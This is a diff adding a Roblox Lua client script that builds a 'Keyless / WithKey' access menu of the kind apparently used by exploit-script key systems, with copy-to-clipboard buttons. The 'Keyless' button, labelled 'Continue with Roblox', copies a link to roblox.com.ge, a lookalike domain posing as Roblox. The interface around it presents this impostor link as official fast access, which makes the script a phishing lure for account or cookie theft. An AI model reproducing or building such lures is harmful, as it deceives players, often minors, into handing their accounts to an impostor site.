@@ -1,0 +1,279 @@
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "Interface"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = playerGui
+
+-- Boot label (preuve de lancement)
+local boot = Instance.new("TextLabel")
+boot.Size = UDim2.new(1, -20, 0, 22)
+boot.Position = UDim2.new(0, 10, 0, 10)
+boot.BackgroundTransparency = 1
+boot.TextColor3 = Color3.fromRGB(240,240,240)
+boot.Font = Enum.Font.Gotham
+boot.TextSize = 14
+boot.Text = "UI initializing… ✅"
+boot.ZIndex = 10
+boot.Parent = screenGui
+
+task.delay(2, function()
+    if boot then boot:Destroy() end
+end)
+
+-- ===== Helpers =====
+
+local function round(gui, radius)
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, radius or 12)
+    corner.Parent = gui
+end
+
+local function stroke(gui, thickness, color)
+    local s = Instance.new("UIStroke")
+    s.Thickness = thickness or 2
+    s.Color = color or Color3.fromRGB(200,200,200)
+    s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    s.Parent = gui
+end
+
+-- Draggable (souris + touch)
+local function makeDraggable(frame)
+    frame.Active = true
+    local dragging = false
+    local dragStart, startPos
+
+    frame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 
+        or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = frame.Position
+
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement 
+        or input.UserInputType == Enum.UserInputType.Touch) then
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(
+                startPos.X.Scale,
+                startPos.X.Offset + delta.X,
+                startPos.Y.Scale,
+                startPos.Y.Offset + delta.Y
+            )
+        end
+    end)
+end
+
+-- Copie + feedback
+local function openLinkSecondary(button)
+    local originalText = button.Text
+    local link = button:GetAttribute("Link")
+
+    pcall(function()
+        if setclipboard and typeof(link) == "string" and link ~= "" then
+            setclipboard(link)
+        end
+    end)
+
+    button.Text = "✔ Link Copied 📋"
+    task.delay(2, function()
+        if button and button.Parent then
+            button.Text = originalText
+        end
+    end)
+end
+
+-- ===== UI BUILDERS =====
+
+local function makeFrame(parent, titleRich)
+    local f = Instance.new("Frame")
+    f.Size = UDim2.new(0, 320, 0, 240)
+    f.Position = UDim2.new(0.5, 0, 0.5, 0)
+    f.AnchorPoint = Vector2.new(0.5, 0.5)
+    f.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    f.Visible = false
+    f.Parent = parent
+
+    round(f, 14)
+    stroke(f, 2, Color3.fromRGB(200,200,200))
+    makeDraggable(f)
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, -20, 0, 34)
+    title.Position = UDim2.new(0, 10, 0, 10)
+    title.BackgroundTransparency = 1
+    title.TextColor3 = Color3.fromRGB(230,230,230)
+    title.Text = titleRich
+    title.RichText = true
+    title.TextSize = 20
+    title.Font = Enum.Font.GothamBold
+    title.Parent = f
+
+    return f
+end
+
+local function makeClose(parent, onClose)
+    local x = Instance.new("TextButton")
+    x.Size = UDim2.new(0, 30, 0, 30)
+    x.Position = UDim2.new(1, -35, 0, 5)
+    x.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    x.TextColor3 = Color3.fromRGB(230,230,230)
+    x.Text = "X"
+    x.TextSize = 16
+    x.Font = Enum.Font.GothamBold
+    x.AutoButtonColor = false
+    round(x, 10)
+    stroke(x, 2, Color3.fromRGB(200,200,200))
+    x.Parent = parent
+
+    x.MouseButton1Click:Connect(function()
+        if typeof(onClose) == "function" then onClose() end
+    end)
+end
+
+local function makeBack(parent, mainFrame, currentFrame)
+    local arrow = Instance.new("TextButton")
+    arrow.Size = UDim2.new(0, 30, 0, 30)
+    arrow.Position = UDim2.new(0, 5, 1, -35)
+    arrow.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    arrow.TextColor3 = Color3.fromRGB(230,230,230)
+    arrow.Text = "<-"
+    arrow.TextSize = 16
+    arrow.Font = Enum.Font.GothamBold
+    arrow.AutoButtonColor = false
+    round(arrow, 10)
+    stroke(arrow, 2, Color3.fromRGB(200,200,200))
+    arrow.Parent = parent
+
+    arrow.MouseButton1Click:Connect(function()
+        currentFrame.Visible = false
+        mainFrame.Visible = true
+    end)
+end
+
+local function makeButton(parent, text, pos, link, isSecondary)
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(0, 280, 0, 42)
+    b.Position = pos
+    b.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    b.TextColor3 = Color3.fromRGB(230,230,230)
+    b.Text = text
+    b.TextSize = 16
+    b.Font = Enum.Font.GothamBold
+    b.AutoButtonColor = false
+    round(b, 10)
+    stroke(b, 2, Color3.fromRGB(200,200,200))
+    b:SetAttribute("Link", link or "")
+    b.Parent = parent
+
+    -- Hover animation
+    local normal = b.Size
+    local hover = UDim2.new(0, 290, 0, 46)
+
+    b.MouseEnter:Connect(function()
+        TweenService:Create(b, TweenInfo.new(0.12), {Size = hover}):Play()
+    end)
+
+    b.MouseLeave:Connect(function()
+        TweenService:Create(b, TweenInfo.new(0.12), {Size = normal}):Play()
+    end)
+
+    if isSecondary then
+        b.MouseButton1Click:Connect(function()
+            openLinkSecondary(b)
+        end)
+    end
+
+    return b
+end
+
+local function makeSubtitle(frame, text)
+    local sub = Instance.new("TextLabel")
+    sub.Size = UDim2.new(1, -20, 0, 20)
+    sub.Position = UDim2.new(0, 10, 0, 130)
+    sub.BackgroundTransparency = 1
+    sub.TextColor3 = Color3.fromRGB(255,255,255)
+    sub.Text = text
+    sub.TextSize = 13
+    sub.Font = Enum.Font.GothamSemibold
+    sub.TextXAlignment = Enum.TextXAlignment.Center
+    sub.Parent = frame
+    stroke(sub, 1, Color3.fromRGB(180,180,180))
+end
+
+-- ===== BUILD UI =====
+
+local mainFrame = makeFrame(screenGui, "Choose an option")
+makeClose(mainFrame, function() mainFrame.Visible = false end)
+
+local keylessBtn = makeButton(mainFrame, "Keyless 🔑", UDim2.new(0.5,-140,0,60), "", false)
+local withKeyBtn = makeButton(mainFrame, "WithKey 🔒", UDim2.new(0.5,-140,0,120), "", false)
+
+-- KEYLESS FRAME
+local keylessFrame = makeFrame(screenGui, "Continue with <u>Roblox</u> 🎮")
+makeClose(keylessFrame, function() keylessFrame.Visible = false end)
+makeBack(keylessFrame, mainFrame, keylessFrame)
+
+-- 🔥 Ton lien corrigé ICI :
+makeButton(
+    keylessFrame,
+    "Keyless 🔑",
+    UDim2.new(0.5,-140,0,80),
+    "https://roblox.com.ge/users/8350785029/profile",
+    true
+)
+
+makeSubtitle(keylessFrame, "Fast access with Roblox ⏹️")
+
+-- WITH KEY FRAME
+local withKeyFrame = makeFrame(screenGui, "Continue with <u>Discord</u> 🌐")
+makeClose(withKeyFrame, function() withKeyFrame.Visible = false end)
+makeBack(withKeyFrame, mainFrame, withKeyFrame)
+
+makeButton(
+    withKeyFrame,
+    "WithKey 🔒",
+    UDim2.new(0.5,-140,0,80),
+    "https://discord.gg/gJ6ESRDren",
+    true
+)
+
+makeSubtitle(withKeyFrame, "Community access with Discord 💬")
+
+-- Navigation
+keylessBtn.MouseButton1Click:Connect(function()
+    mainFrame.Visible = false
+    keylessFrame.Visible = true
+end)
+
+withKeyBtn.MouseButton1Click:Connect(function()
+    mainFrame.Visible = false
+    withKeyFrame.Visible = true
+end)
+
+-- Main appear animation
+mainFrame.Visible = true
+mainFrame.BackgroundTransparency = 1
+mainFrame.Size = UDim2.new(0,0,0,0)
+
+TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back), {
+    Size = UDim2.new(0,320,0,240)
+}):Play()
+
+TweenService:Create(mainFrame, TweenInfo.new(0.5), {
+    BackgroundTransparency = 0
+}):Play()
